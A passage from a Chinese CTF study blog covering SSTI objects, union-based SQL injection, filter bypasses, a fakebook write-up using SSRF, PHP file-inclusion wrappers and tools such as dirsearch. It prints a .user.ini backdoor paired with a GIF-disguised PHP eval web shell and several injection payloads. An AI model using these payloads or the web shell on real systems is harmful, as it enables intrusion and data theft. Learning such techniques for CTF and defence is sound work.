+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># handler</span></span><br><span class="line">&#123;&#123; handler.get_argument(<span class="string">&#x27;cmd&#x27;</span>) &#125;&#125;    <span class="comment"># 获取名为 cmd 的 GET 或 POST 参数</span></span><br><span class="line">&#123;&#123; handler.request.arguments &#125;&#125;      <span class="comment"># 以字典形式返回所有参数</span></span><br><span class="line">&#123;&#123; handler.settings &#125;&#125;               <span class="comment"># 包含 Tornado 的配置信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># request 访问当前 HTTP 请求</span></span><br><span class="line">request.url</span><br><span class="line">request.method</span><br></pre></td></tr></table></figure>
+
+<h3 id="题目记录"><a href="#题目记录" class="headerlink" title="题目记录"></a>题目记录</h3><p><strong>ezssti</strong></p>
+<p>过滤数字时，可以通过 <code>__len__()</code> 函数获取数字。</p>
+<p><strong>攻防世界 shrine</strong></p>
+<p>过滤了正反括号时，可尝试使用 <code>url_for</code>。</p>
+<hr>
+<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><p>通过注入可以查到数据库中的内容。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- --+ 的目的是注释后面代码，+ 在 URL 中表示空白符</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆破列数</span></span><br><span class="line"><span class="comment">-- ORDER BY 1 是按第一列排序，如果正常，说明至少有 1 列</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> N;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 或使用 union select 联合查询，将 select 查询到的结果一同返回</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4.</span>..</span><br><span class="line"><span class="comment">-- 列数要与之前相同，同时可以找到页面回显的位置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 假如列数为 4 且回显位置为 2</span></span><br><span class="line"><span class="comment">-- 得到数据库名</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span>; <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- MySQL 的 information_schema 记录了所有表信息</span></span><br><span class="line"><span class="comment">-- 使用 group_concat() 把多个表名拼成一行</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="keyword">from</span> information_schema.tables</span><br><span class="line"><span class="keyword">where</span> table_schema<span class="operator">=</span>database(); <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询表中的列，假设表名为 mytable</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="keyword">from</span> information_schema.columns</span><br><span class="line"><span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;mytable&#x27;</span>; <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询列信息 data</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(data),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> mytable; <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="常见过滤绕过"><a href="#常见过滤绕过" class="headerlink" title="常见过滤绕过"></a>常见过滤绕过</h3><table>
+<thead>
+<tr>
+<th>被过滤字符</th>
+<th>绕过方式</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>空格</td>
+<td><code>/**/</code></td>
+<td>在 SQL 中，注释符可作为空白分隔符</td>
+</tr>
+<tr>
+<td>空格</td>
+<td><code>%0a</code>, <code>%a0</code></td>
+<td>使用换行符或不换行空格的编码</td>
+</tr>
+<tr>
+<td>单引号</td>
+<td><code>0x</code> Hex</td>
+<td>将字符串转为十六进制，如 <code>&#39;flag&#39;</code> -&gt; <code>0x666c6167</code></td>
+</tr>
+<tr>
+<td>关键字</td>
+<td>双写 &#x2F; 大小写</td>
+<td>如 <code>UNunionION</code> 或 <code>uNiOn</code>，视环境而定</td>
+</tr>
+</tbody></table>
+<p>盲注无回显时，可以借助脚本爆破。</p>
+<h3 id="例题：攻防世界-fakebook"><a href="#例题：攻防世界-fakebook" class="headerlink" title="例题：攻防世界 fakebook"></a>例题：攻防世界 fakebook</h3><p>常规爆破得到：</p>
+<ul>
+<li>字段数：4</li>
+<li>数据库名：<code>fakebook</code></li>
+<li>表名：<code>users</code></li>
+<li>列名：<code>no</code>、<code>username</code>、<code>passwd</code>、<code>data</code></li>
+</ul>
+<p>读取 <code>data</code> 得到序列化字符串：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:14:&quot;http://test.com&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过目录扫描找到关键目录：</p>
+<p><img src="/../../images/dirset.png"></p>
+<p>方法一：使用 <code>load_file(&quot;/var/www/html/flag.php&quot;)</code> 读取文件。</p>
+<p>方法二：通过修改 <code>blog</code> 值达到 SSRF 的作用。</p>
+<p>尝试：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>修改后访问，读取到 base64 加密 flag：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">&#x27;100%&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;10em&#x27;</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg==&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="user-ini-文件利用"><a href="#user-ini-文件利用" class="headerlink" title=".user.ini 文件利用"></a><code>.user.ini</code> 文件利用</h3><p>只要 PHP 以 FastCGI 方式运行，就可以尝试使用 <code>.user.ini</code>。</p>
+<p><code>.user.ini</code> 文件可以作为 PHP 配置文件，利用配置项构造后门。</p>
+<ul>
+<li><code>auto_append_file</code>：指定一个文件，自动包含在要执行的文件后。</li>
+<li><code>auto_prepend_file</code>：指定一个文件，自动包含在要执行的文件前。</li>
+</ul>
+<p>示例目录：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|-- .user.ini  // 配置文件</span><br><span class="line">|-- shell.jpg  // 伪装成图片的后门</span><br><span class="line">|-- index.php  // 网站正常文件</span><br></pre></td></tr></table></figure>
+
+<p><code>.user.ini</code> 内容：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=shell.jpg</span><br></pre></td></tr></table></figure>
+
+<p><code>shell.jpg</code> 内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问网站任意 PHP 文件时，就会自动执行 <code>shell.jpg</code> 中的 PHP 代码。</p>
+<hr>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p><code>include(flag.php)</code> 会执行文件中的 PHP 代码并输出结果。如果遇到无法解析的部分，会直接输出文件原本内容。</p>
+<p>因此可以结合 PHP 伪协议读取源码。</p>
+<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p><code>php://filter</code> 是 PHP 的过滤协议，作用是读取文件内容时，先经过指定过滤器处理，再返回处理后的内容。</p>
+<p>核心用法：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/[过滤器]/resource=[目标文件]</span><br></pre></td></tr></table></figure>
+
+<p>常用过滤器：</p>
+<ol>
+<li><code>convert.base64-encode</code>：将文件内容转成 base64 编码。</li>
+<li><code>convert.iconv.输入编码.输出编码</code>：进行编码转换。</li>
+</ol>
+<p>常见编码方式：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*</span><br><span class="line">UCS-4BE</span><br><span class="line">UCS-4LE*</span><br><span class="line">UCS-2</span><br><span class="line">UCS-2BE</span><br><span class="line">UCS-2LE</span><br><span class="line">UTF-32*</span><br><span class="line">UTF-32BE*</span><br><span class="line">UTF-32LE*</span><br><span class="line">UTF-16*</span><br><span class="line">UTF-16BE*</span><br><span class="line">UTF-16LE*</span><br><span class="line">UTF-7</span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-8</span><br><span class="line">ASCII</span><br></pre></td></tr></table></figure>
+
+<h3 id="file-get-contents-与-data"><a href="#file-get-contents-与-data" class="headerlink" title="file_get_contents 与 data:&#x2F;&#x2F;"></a>file_get_contents 与 data:&#x2F;&#x2F;</h3><p><code>file_get_contents(flag.php)</code> 用于读取指定资源的内容。</p>
+<p><code>data://[数据类型],[数据内容]</code> 的作用是直接将协议后面的文本或编码数据作为虚拟文件内容返回。</p>
+<p>核心用法：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://[数据类型],[数据内容]</span><br></pre></td></tr></table></figure>
+
+<p>示例数据类型：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text/plain</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="githack"><a href="#githack" class="headerlink" title="githack"></a>githack</h3><p>用于利用 Git 泄露。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/.git</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 githack.py http://target.com/.git/_</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>githack.py</code> 同一目录下会新建网站泄露文件。</p>
+<h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p>目录扫描工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -h</span><br><span class="line">python dirsearch.py -u http://example.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="fenjing"><a href="#fenjing" class="headerlink" title="fenjing"></a>fenjing</h3><p>自动化 SSTI 注入工具。</p>
+<p>在 <code>fenjing</code> 文件目录下运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing.webui</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><h3 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">myproject/                # 项目根目录(项目名称)</span><br><span class="line">├── manage.py             # 项目管理脚本</span><br><span class="line">├── myproject/            # 项目配置目录（与项目同名）</span><br><span class="line">│   ├── __init__.py       # 标记为 Python 包</span><br><span class="line">│   ├── settings.py       # 项目配置文件</span><br><span class="line">│   ├── urls.py           # 全局 URL 路由</span><br><span class="line">│   ├── asgi.py           # ASGI 入口（异步部署）</span><br><span class="line">│   └── wsgi.py           # WSGI 入口（同步部署）</span><br><span class="line">├── myapp/                # 应用目录（通过 startapp 创建）</span><br><span class="line">│   ├── __init__.py       # 标记为 Python 包</span><br><span class="line">│   ├── admin.py          # 管理后台配置</span><br><span class="line">│   ├── apps.py           # 应用配置</span><br><span class="line">│   ├── migrations/       # 数据库迁移文件</span><br><span class="line">│   │   ├── __init__.py</span><br><span class="line">│   │   └── 0001_initial.py</span><br><span class="line">│   ├── models.py         # 数据模型定义</span><br><span class="line">│   ├── tests.py          # 测试用例</span><br><span class="line">│   ├── views.py          # 视图逻辑</span><br><span class="line">│   └── urls.py           # 应用内 URL 路由（需手动创建）</span><br><span class="line">├── templates/            # 模板文件夹（需手动创建）</span><br><span class="line">│   └── myapp/</span><br><span class="line">│       └── home.html</span><br><span class="line">├── static/               # 静态文件文件夹（需手动创建）</span><br><span class="line">│   └── myapp/</span><br><span class="line">│       ├── css/</span><br><span class="line">│       └── js/</span><br><span class="line">└── db.sqlite3            # 默认 SQLite 数据库文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h3><p>作用：项目核心配置文件，定义数据库、应用、静态文件、模板等设置。</p>
+<p>重要配置项：</p>
+<ul>
+<li><code>INSTALLED_APPS</code>：注册项目使用的应用，包括 Django 内置应用和自定义应用。</li>
+<li><code>DATABASES</code>：数据库配置，如 SQLite、PostgreSQL。</li>
+<li><code>STATIC_URL</code> 和 <code>STATIC_ROOT</code>：静态文件路径。</li>
+<li><code>TEMPLATES</code>：模板引擎配置。</li>
+<li><code>ALLOWED_HOSTS</code>：允许访问的主机，生产环境需要设置。</li>
+</ul>
+<p>Django 报错结构：</p>
+<p><img src="/../../images/djangoerror.png"></p>
+<hr>
+<h2 id="GBK-GDK-编码宽字节注入"><a href="#GBK-GDK-编码宽字节注入" class="headerlink" title="GBK&#x2F;GDK 编码宽字节注入"></a>GBK&#x2F;GDK 编码宽字节注入</h2><p>待补充。</p>
+<hr>
+<h2 id="Java-原型链污染"><a href="#Java-原型链污染" class="headerlink" title="Java 原型链污染"></a>Java 原型链污染</h2><p>待补充。</p>
+
+    </div>
+
+    
+    
+    
+
+    
+      <div>
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:24px;">-------------到底咯QAQ嘎嘎-------------</div>
+    
+</div>
+      </div>
+    <script src="https://giscus.app/client.js"
+        data-repo="jachinzhang1/jachinzhang1.github.io"
+        data-repo-id="R_kgDONy_q0w"
+        data-category="Announcements"
+        data-category-id="DIC_kwDONy_q084Cmo0P"
+        data-mapping="title"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="top"
+        data-theme="preferred_color_scheme"
+        data-lang="zh-CN"
+        data-loading="lazy"
+        crossorigin="anonymous"
+        async>
+</script>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2026/05/20/%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E6%8E%A5%E5%8F%A3%E8%AE%BE%E8%AE%A1/" rel="prev" title="接口实验">
+      <i class="fa fa-chevron-left"></i> 接口实验
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/06/01/CTF/WHUCTF2026%E6%A0%A1%E8%B5%9B/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-circle"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">山河辽阔，人间烟火 | 记录生活与思考的碎片</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/js/site-interactions.js"></script>
+<script>
+  (function() {
+    var overlay = document.createElement('div');
+    overlay.className = 'page-transition-overlay';
+    document.body.appendChild(overlay);
+
+    document.addEventListener('click', function(e) {
+      var link = e.target.closest('a');
+      if (!link || !link.href) return;
+      if (link.target === '_blank') return;
+      if (link.host !== window.location.host) return;
+      if (link.getAttribute('download') != null) return;
+      if (link.hash && link.pathname === window.location.pathname) return;
+      if (e.metaKey || e.ctrlKey) return;
+
+      e.preventDefault();
+      document.body.classList.add('page-exiting');
+      setTimeout(function() {
+        window.location = link.href;
+      }, 260);
+    });
+
+    // Keep overlay hidden when navigating back via bfcache.
+    window.addEventListener('pageshow', function(e) {
+      document.body.classList.remove('page-exiting');
+    });
+  })();
+</script>
+
+</body>
+</html>
